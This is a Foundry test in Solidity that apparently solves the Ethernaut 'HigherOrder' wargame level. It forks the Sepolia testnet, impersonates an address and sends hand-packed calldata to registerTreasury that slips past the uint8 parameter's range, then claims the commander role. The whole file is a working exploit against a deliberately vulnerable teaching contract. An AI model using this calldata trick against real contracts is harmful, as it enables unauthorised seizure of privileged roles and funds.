// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {HelpUtils} from "./HelpUtils.sol";
import {Test, console} from "forge-std/Test.sol";
import {HigherOrder} from "../src/ethernaut/HigherOrder.sol";

contract HigherOrderAttacker is Test {
    address constant higherOrder = 0x1A71927eEeAe3b032ccf515D9c66464f12009B66;
    uint256 constant blockNumber = 6354746;
    address constant alice = 0x6278A1E803A76796a3A1f7F6344fE874ebfe94B2;

    function setUp() external {
        vm.selectFork(
            vm.createFork(vm.envString("SEPOLIA_RPC_URL"), blockNumber)
        );
    }

    function testAttack() public {
        console.log("Attack Before:");
        console.log("commander:", HigherOrder(higherOrder).commander());

        console.log("treasury:", HigherOrder(higherOrder).treasury());
        _attack();
        console.log("Attack After:");
        console.log("commander:", HigherOrder(higherOrder).commander());
        console.log("treasury:", HigherOrder(higherOrder).treasury());
        assertEq(HigherOrder(higherOrder).commander(), alice);
    }

    function _attack() internal {
        vm.startPrank(alice);

        bytes memory calldata_ = abi.encodePacked(
            HigherOrder.registerTreasury.selector,
            uint8(255),
            uint256(0)
        );

        console.logBytes(calldata_);

        (bool success, ) = higherOrder.call(calldata_);

        require(success);

        HigherOrder(higherOrder).claimLeadership();
        vm.stopPrank();
    }
}

// forge test --match-contract HigherOrderAttacker --match-test "testAttack"
